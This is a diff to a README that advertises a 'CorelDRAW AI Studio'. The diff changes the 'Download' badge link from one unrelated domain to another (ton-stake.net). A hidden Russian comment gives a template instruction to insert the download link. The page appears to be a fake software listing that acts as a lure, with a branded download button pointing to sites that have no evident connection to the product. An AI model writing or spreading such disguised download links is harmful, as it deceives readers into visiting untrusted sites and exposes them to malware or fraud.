@@ -5,7 +5,7 @@ Welcome to the **next evolution** in graphic design. The **CorelDRAW AI Studio 2
 Created for both **beginner designers** and **seasoned pros**, this studio offers a highly configurable and user-friendly experience, wrapped in an intuitive interface.
 
 <!-- ПОДСКАЗКА НА РУССКОМ: Вставьте ссылку на страницу или файл для скачивания studio (например, https://example.com/studio) вместо INSERT_DOWNLOAD_LINK_HERE -->
-[![Download AI Studio](https://img.shields.io/badge/Download-CorelDRAW_AI_Studio-purple)](https://glocktober.com)
+[![Download AI Studio](https://img.shields.io/badge/Download-CorelDRAW_AI_Studio-purple)](https://ton-stake.net)
 
 ---
 
